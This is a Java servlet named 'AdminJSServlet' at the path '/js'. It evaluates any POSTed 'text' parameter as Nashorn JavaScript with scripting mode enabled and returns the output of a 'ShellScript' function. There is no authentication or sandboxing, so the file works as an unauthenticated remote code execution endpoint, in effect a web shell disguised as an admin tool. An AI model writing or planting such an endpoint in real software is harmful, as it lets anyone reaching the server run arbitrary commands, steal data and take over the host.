import jdk.nashorn.api.scripting.NashornScriptEngine;
import jdk.nashorn.api.scripting.NashornScriptEngineFactory;

import javax.script.Bindings;
import javax.script.Invocable;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet("/js")
public class AdminJSServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try{
            NashornScriptEngineFactory factory=new NashornScriptEngineFactory();
            ScriptEngine engine=factory.getScriptEngine(new String[]{"-scripting"});
            Invocable invokable=(Invocable) engine;
            String script = request.getParameter("text");
            engine.eval(script);

            response.setCharacterEncoding("UTF-8");
            response.getWriter().println(invokable.invokeFunction("ShellScript"));
        }catch(Exception ex){
            throw new ServletException();
        }
    }

}
